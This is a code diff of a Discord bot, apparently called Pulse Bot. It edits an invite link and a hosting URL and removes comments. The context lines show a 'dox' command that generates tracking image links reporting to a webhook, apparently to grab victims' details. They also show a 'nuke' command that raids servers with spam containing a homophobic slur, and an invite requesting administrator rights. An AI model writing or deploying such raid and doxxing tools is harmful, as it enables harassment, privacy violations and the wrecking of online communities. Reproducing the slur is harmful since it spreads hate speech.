@@ -6,7 +6,7 @@ const crypto = require('crypto');
 
 const TOKEN = process.env.TOKEN;
 const PORT = process.env.PORT || 3000;
-const INVITE_LINK = 'https://discord.gg/FCJ5EjVmG';
+const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 
 if (!TOKEN) {
     console.error('❌ TOKEN environment variable is required!');
@@ -141,7 +141,6 @@ client.on('interactionCreate', async (interaction) => {
     const { commandName, options, user, member, guild, channel } = interaction;
 
     try {
-        // ---- DOX - FIXED (NO SERVER CHECK) ----
         if (commandName === 'dox') {
             await interaction.deferReply({ ephemeral: true });
             
@@ -151,7 +150,7 @@ client.on('interactionCreate', async (interaction) => {
             }
             
             const id = crypto.randomBytes(6).toString('hex');
-            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
+            const url = `https://YOUR-WISPBYTE-URL.com/img/${id}.png`;
             links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });
             
             const embed = new EmbedBuilder()
@@ -163,7 +162,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- NUKE ----
         if (commandName === 'nuke') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -178,7 +176,6 @@ client.on('interactionCreate', async (interaction) => {
             await startNuke(guild);
         }
 
-        // ---- STOP ----
         if (commandName === 'stop') {
             await interaction.deferReply({ ephemeral: true });
             if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
@@ -187,14 +184,12 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('⏹️ **Nuke stopped.**');
         }
 
-        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
             await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
         }
 
-        // ---- SERVERINFO ----
         if (commandName === 'serverinfo') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -214,7 +209,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- USERINFO ----
         if (commandName === 'userinfo') {
             await interaction.deferReply({ ephemeral: true });
             const target = interaction.options.getUser('user') || user;
@@ -237,7 +231,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- AVATAR ----
         if (commandName === 'avatar') {
             await interaction.deferReply({ ephemeral: true });
             const target = interaction.options.getUser('user') || user;
@@ -248,7 +241,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- SAY ----
         if (commandName === 'say') {
             await interaction.deferReply({ ephemeral: true });
             const msg = interaction.options.getString('message');
@@ -257,7 +249,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('✅ Sent.');
         }
 
-        // ---- KICK ----
         if (commandName === 'kick') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -276,7 +267,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.user.tag}** kicked. Reason: ${reason}`);
         }
 
-        // ---- BAN ----
         if (commandName === 'ban') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -295,7 +285,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.tag}** banned. Reason: ${reason}`);
         }
 
-        // ---- CLEAR ----
         if (commandName === 'clear') {
             await interaction.deferReply({ ephemeral: true });
             const amount = interaction.options.getInteger('amount');
@@ -309,7 +298,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Deleted ${messages.size} messages.`);
         }
 
-        // ---- TIMEOUT ----
         if (commandName === 'timeout') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -325,7 +313,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.user.tag}** timed out for ${minutes} minutes. Reason: ${reason}`);
         }
 
-        // ---- UPTIME ----
         if (commandName === 'uptime') {
             const uptime = Date.now() - startTime;
             const days = Math.floor(uptime / 86400000);
@@ -335,13 +322,11 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply(`⏱️ **Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s`);
         }
 
-        // ---- INVITE ----
         if (commandName === 'invite') {
             const inviteURL = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot+applications.commands`;
             await interaction.reply(`🔗 **Invite Pulse Bot:**\n${inviteURL}`);
         }
 
-        // ---- STATS ----
         if (commandName === 'stats') {
             const totalServers = client.guilds.cache.size;
             const totalUsers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
@@ -359,7 +344,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply({ embeds: [embed] });
         }
 
-        // ---- POLL ----
         if (commandName === 'poll') {
             await interaction.deferReply({ ephemeral: true });
             const question = interaction.options.getString('question');
@@ -380,7 +364,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('✅ Poll created!');
         }
 
-        // ---- SLOWMODE ----
         if (commandName === 'slowmode') {
             await interaction.deferReply({ ephemeral: true });
             const seconds = interaction.options.getInteger('seconds');
@@ -393,7 +376,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
         }
 
-        // ---- LOCK ----
         if (commandName === 'lock') {
             await interaction.deferReply({ ephemeral: true });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -405,7 +387,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`🔒 **${targetChannel.name}** locked.`);
         }
 
-        // ---- UNLOCK ----
         if (commandName === 'unlock') {
             await interaction.deferReply({ ephemeral: true });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -417,7 +398,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`🔓 **${targetChannel.name}** unlocked.`);
         }
 
-        // ---- ROLELIST ----
         if (commandName === 'rolelist') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -441,7 +421,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- START NUKE ----
 async function startNuke(guild) {
     const variants = [
         '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -508,7 +487,6 @@ async function startNuke(guild) {
     });
 }
 
-// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
     return `
 <!DOCTYPE html>
